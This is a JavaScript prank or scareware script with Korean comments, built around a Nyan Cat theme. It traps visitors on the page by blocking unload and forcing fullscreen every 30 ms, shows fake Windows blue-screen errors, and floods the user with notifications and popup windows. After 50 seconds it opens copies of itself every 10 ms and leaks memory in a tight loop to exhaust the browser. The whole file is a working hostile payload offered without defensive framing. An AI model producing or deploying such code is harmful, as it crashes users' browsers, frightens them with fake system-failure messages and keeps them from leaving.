(function() {
    // 1. 사이트 이탈 방지 (beforeunload 이벤트 트랩)
    window.addEventListener('beforeunload', function (e) {
        e.preventDefault();
        e.returnValue = '';
        return '';
    });

    // 2. 치명적인 시스템 오류 경고창
    const fatalAlerts = [
        "CRITICAL_PROCESS_DIED: 0x000000EF\n\nMemory dump at 0xFFFFFFF480",
        "KERNEL_DATA_INPAGE_ERROR\nSTOP: 0x0000007A (0xC000009D, 0x00000000, 0x00000000, 0x00000000)",
        "SYSTEM_THREAD_EXCEPTION_NOT_HANDLED\n\nFailed to allocate memory in non-paged pool."
    ];
    alert(fatalAlerts[Math.floor(Math.random() * fatalAlerts.length)]);

    // 3. 무한 강제 전체화면 유지 락 (탈출 원천 차단)
    function lockFullscreen() {
        const doc = document.documentElement;
        if (!document.fullscreenElement) {
            if (doc.requestFullscreen) doc.requestFullscreen();
            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
            else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
        }
    }
    ['mousemove', 'click', 'keydown', 'touchstart', 'visibilitychange', 'focus'].forEach(event => {
        document.addEventListener(event, lockFullscreen);
    });
    setInterval(lockFullscreen, 30); // 0.03초마다 전체화면 강제 고정

    // 4. 그래픽 카드 고장 / VRAM 손상 극대화 시각 효과
    const gpuCrashStyle = document.createElement('style');
    gpuCrashStyle.type = 'text/css';
    gpuCrashStyle.innerHTML = `
        body > *:not(#nyan-supreme-container) {
            filter: grayscale(100%) contrast(1000%) invert(1) drop-shadow(15px 0px 0px red) drop-shadow(-15px 0px 0px blue) !important;
            pointer-events: none !important;
            animation: vramCorruption 0.02s infinite alternate step-end !important;
            transform-origin: center center;
        }
        @keyframes vramCorruption {
            0% { transform: skew(0deg) scale(1) translate(0px, 0px); filter: invert(1) contrast(500%); opacity: 1; }
            25% { transform: skew(25deg) scale(1.2) translate(-30px, 20px); filter: invert(0) contrast(3000%) hue-rotate(90deg); opacity: 0.8; }
            50% { transform: skew(-35deg) scale(0.8) translate(40px, -30px); filter: invert(1) contrast(300%); opacity: 1; }
            75% { transform: skew(20deg) scale(1.4) translate(-20px, 40px); filter: invert(0) contrast(2000%) hue-rotate(180deg); opacity: 0.9; }
            100% { transform: skew(0deg) scale(1) translate(0px, 0px); filter: invert(0) contrast(1000%); opacity: 1; }
        }
        @keyframes screenTearExtreme {
            0% { clip-path: polygon(0 0, 100% 0, 100% 5%, 0 5%); transform: translateX(30px); }
            33% { clip-path: polygon(0 30%, 100% 30%, 100% 45%, 0 45%); transform: translateX(-40px); }
            66% { clip-path: polygon(0 70%, 100% 70%, 100% 85%, 0 85%); transform: translateX(50px); }
            100% { clip-path: polygon(0 95%, 100% 95%, 100% 100%, 0 100%); transform: translateX(-30px); }
        }
    `;
    document.head.appendChild(gpuCrashStyle);

    // 5. 무한 백그라운드 시스템 알림
    if (typeof Notification !== 'undefined') {
        Notification.requestPermission().then(permission => {
            if (permission === 'granted') {
                setInterval(() => {
                    const errorCodes = ["0x80004005", "0x000000F4", "0xC000021A", "0x00000139", "0xDEADBEEF"];
                    for (let i = 0; i < 5; i++) {
                        new Notification("SYSTEM CORRUPTION", {
                            body: `FATAL EXCEPTION: ${errorCodes[Math.floor(Math.random() * errorCodes.length)]} - MEMORY OVERFLOW`,
                            icon: "https://dl.dropboxusercontent.com/scl/fi/r6hefa32fztkj52a6leb6/Nyan-Cat-Official.gif?rlkey=pgnlzd5ubcwb9e4ayrmaoxud1&st=b3c8d53g"
                        });
                    }
                }, 80);
            }
        });
    }

    // 최상위 컨테이너 생성
    const container = document.createElement('div');
    container.id = 'nyan-supreme-container';
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.width = '100vw';
    container.style.height = '100vh';
    container.style.backgroundColor = '#000080';
    container.style.overflow = 'hidden';
    container.style.zIndex = '2147483647';
    document.body.appendChild(container);

    // 6. 캔버스 하이퍼스페이스
    const canvas = document.createElement('canvas');
    canvas.style.position = 'absolute';
    canvas.style.top = '0';
    canvas.style.left = '0';
    canvas.style.width = '100%';
    canvas.style.height = '100%';
    canvas.style.pointerEvents = 'none';
    container.appendChild(canvas);
    
    const ctx = canvas.getContext('2d', { alpha: false });
    let w = canvas.width = window.innerWidth;
    let h = canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
        w = canvas.width = window.innerWidth;
        h = canvas.height = window.innerHeight;
    });

    const nyanImg = new Image();
    nyanImg.src = 'https://dl.dropboxusercontent.com/scl/fi/r6hefa32fztkj52a6leb6/Nyan-Cat-Official.gif?rlkey=pgnlzd5ubcwb9e4ayrmaoxud1&st=b3c8d53g';

    const maxEntities = 12000;
    const entities = [];
    const hexCodes = ["0xDEADBEEF", "0xFFFFFF", "ERR_MEM", "NULL_PTR", "0x00000000", "0x800F081F", "SYSTEM_HALT"];

    for (let i = 0; i < maxEntities; i++) {
        entities.push({
            x: (Math.random() - 0.5) * 4000,
            y: (Math.random() - 0.5) * 4000,
            z: Math.random() * 2000,
            speed: Math.random() * 80 + 35,
            isText: Math.random() > 0.5,
            text: hexCodes[Math.floor(Math.random() * hexCodes.length)]
        });
    }

    let rotationAngle = 0;

    function renderHyperspace() {
        ctx.fillStyle = 'rgba(0, 0, 128, 0.4)';
        ctx.fillRect(0, 0, w, h);
        const cx = w / 2;
        const cy = h / 2;
        rotationAngle += 0.025;

        for (let i = 0; i < maxEntities; i++) {
            const e = entities[i];
            e.z -= e.speed; 
            if (e.z <= 0) {
                e.z = 2000;
                e.x = (Math.random() - 0.5) * 4000;
                e.y = (Math.random() - 0.5) * 4000;
            }
            const scale = 800 / e.z;
            const cosA = Math.cos(rotationAngle);
            const sinA = Math.sin(rotationAngle);
            const rx = e.x * cosA - e.y * sinA;
            const ry = e.x * sinA + e.y * cosA;
            const px = cx + rx * scale;
            const py = cy + ry * scale;
            const size = 60 * scale;

            if (px > -size && px < w + size && py > -size && py < h + size) {
                if (e.isText) {
                    ctx.fillStyle = '#FFFFFF';
                    ctx.font = `bold ${size * 0.5}px "Courier New", monospace`;
                    ctx.fillText(e.text, px, py);
                } else {
                    ctx.save();
                    ctx.translate(px, py);
                    ctx.rotate((e.z % 360) * Math.PI / 180);
                    ctx.drawImage(nyanImg, -size / 2, -size / 2, size, size);
                    ctx.restore();
                }
            }
        }
        window.nyanAnimFrame = requestAnimationFrame(renderHyperspace);
    }
    nyanImg.onload = () => renderHyperspace();

    // 7. 중앙 보스 냥캣
    const bossStyle = document.createElement('style');
    bossStyle.type = 'text/css';
    bossStyle.innerHTML = `
        @keyframes glitchBossExtreme {
            0% { transform: translate(-50%, -50%) scale(1) skew(0deg); filter: invert(0); }
            10% { transform: translate(-55%, -45%) scale(1.3) skew(25deg); filter: invert(1) hue-rotate(90deg) contrast(300%); }
            20% { transform: translate(-45%, -55%) scale(0.7) skew(-25deg); filter: invert(0) brightness(8); }
            30% { transform: translate(-50%, -50%) scale(1.6) skew(15deg); filter: invert(1) hue-rotate(180deg) blur(8px); }
            40% { transform: translate(-48%, -52%) scale(0.9) skew(-20deg); filter: invert(0) contrast(500%); }
            50% { transform: translate(-52%, -48%) scale(1.2) skew(10deg); filter: invert(1) drop-shadow(0 0 80px red); }
            100% { transform: translate(-50%, -50%) scale(1) skew(0deg); filter: invert(0); }
        }
    `;
    document.head.appendChild(bossStyle);

    const megaBoss = document.createElement('img');
    megaBoss.src = nyanImg.src;
    megaBoss.style.position = 'absolute';
    megaBoss.style.top = '50%';
    megaBoss.style.left = '50%';
    megaBoss.style.width = '45vw';
    megaBoss.style.zIndex = '999998';
    megaBoss.style.animation = 'glitchBossExtreme 0.03s infinite';
    megaBoss.style.pointerEvents = 'none';
    container.appendChild(megaBoss);

    // BSOD 텍스트 오버레이
    const textOverlay = document.createElement('div');
    textOverlay.innerHTML = `
        <h1 style="font-size: 3vw; margin: 0; color: #fff; background: blue; padding: 5px;">A problem has been detected and windows has been shut down to prevent damage to your computer.</h1>
        <p style="font-size: 2vw; margin: 15px 0 0 0; color: #fff;">UNMOUNTABLE_BOOT_VOLUME<br>Technical information:<br>*** STOP: 0x000000ED (0x80F128D0, 0xC000009C, 0x00000000, 0x00000000)</p>
        <p style="font-size: 3.5vw; color: red; font-weight: bold; margin-top: 20px; text-shadow: 3px 3px 0 #000; animation: screenTearExtreme 0.02s infinite;">SYSTEM FAILURE IMMINENT</p>
    `;
    textOverlay.style.position = 'absolute';
    textOverlay.style.top = '10%';
    textOverlay.style.left = '50%';
    textOverlay.style.transform = 'translate(-50%, -0%)';
    textOverlay.style.fontFamily = '"Courier New", monospace';
    textOverlay.style.zIndex = '9999999';
    textOverlay.style.pointerEvents = 'none';
    textOverlay.style.textAlign = 'left';
    textOverlay.style.width = '90vw';
    container.appendChild(textOverlay);

    // 8. 무한 팝업 폭격 극한화
    function spawnErrorPopups() {
        for (let i = 0; i < 10; i++) {
            const w = 400, h = 250;
            const rx = Math.floor(Math.random() * (window.screen.width - w));
            const ry = Math.floor(Math.random() * (window.screen.height - h));
            const win = window.open('about:blank', '_blank', `width=${w},height=${h},left=${rx},top=${ry}`);
            if (win) {
                try {
                    win.document.write(`
                        <body style="background:#000080; color:white; font-family:'Courier New', monospace; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; overflow:hidden;">
                            <h3 style="background:white; color:#000080; margin:0; font-size:20px; padding:2px 10px; width:100%;">FATAL ERROR</h3>
                            <img src="${nyanImg.src}" width="150" style="margin: 15px 0; filter: invert(1) hue-rotate(180deg);">
                            <p style="font-size:16px; color:#fff; font-weight:bold;">0xDEADDEAD: KERNEL PANIC</p>
                        </body>
                    `);
                } catch(e) {}
            }
        }
    }
    setInterval(spawnErrorPopups, 30); // 0.03초마다 10개씩 폭격

    // 오디오 재생
    const audio = document.createElement('audio');
    audio.src = 'https://dl.dropboxusercontent.com/scl/fi/si7q14q1gm3zuv1uf73th/Nyan-Cat-Official.mp3?rlkey=lxgsv040ukkz3m8lhrs1v006t&st=ga8p79h4';
    audio.loop = true;
    audio.autoplay = true;
    container.appendChild(audio);
    
    const initInteraction = () => {
        audio.play();
        lockFullscreen();
        window.removeEventListener('click', initInteraction);
    };
    window.addEventListener('click', initInteraction);

    // 6초 뒤 화면 분열 및 도배
    setTimeout(() => {
        const floodCover = document.createElement('div');
        floodCover.style.position = 'absolute';
        floodCover.style.top = '0';
        floodCover.style.left = '0';
        floodCover.style.width = '100vw';
        floodCover.style.height = '100vh';
        floodCover.style.backgroundImage = `url(${nyanImg.src})`;
        floodCover.style.backgroundSize = '50px 50px'; 
        floodCover.style.zIndex = '999997'; 
        floodCover.style.animation = 'screenTearExtreme 0.01s infinite, vramCorruption 0.03s infinite alternate';
        container.appendChild(floodCover);
        
        megaBoss.style.transition = 'all 0.05s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
        megaBoss.style.width = '300vw'; 
        megaBoss.style.height = '300vh';
        megaBoss.style.objectFit = 'cover';
        megaBoss.style.animation = 'glitchBossExtreme 0.01s infinite';
    }, 6000);

    // 50초 뒤 극악의 렉 및 새 탭 폭탄 (더 강력한 자원 소모)
    setTimeout(() => {
        alert("STOP: 0x0000008E (0xC0000005, 0xBF819973, 0xF9C4EBAC, 0x00000000)");
        alert("KERNEL_MODE_EXCEPTION_NOT_HANDLED\n\nDisk is unreadable.");
        alert("REGISTRY_ERROR: Attempting to dump physical memory...");
        alert("CRITICAL WARNING: SYSTEM SECURITY COMPROMISED. INITIATING REPLICATION.");

        setInterval(() => {
            window.open(window.location.href, '_blank');
        }, 10); // 0.01초마다 새 탭 복제

        const memoryLeakArray = [];
        setInterval(() => {
            for (let i = 0; i < 500000; i++) {
                Math.sqrt(Math.random() * 9999999);
                const garbageNode = document.createElement('div');
                garbageNode.style.display = 'none';
                document.body.appendChild(garbageNode);
            }
            memoryLeakArray.push(new Array(500000).join('0xDEADBEEF_CORRUPTION_DATA_'));
        }, 2); // 2ms마다 시스템 과부하 가동
    }, 50000);

})();
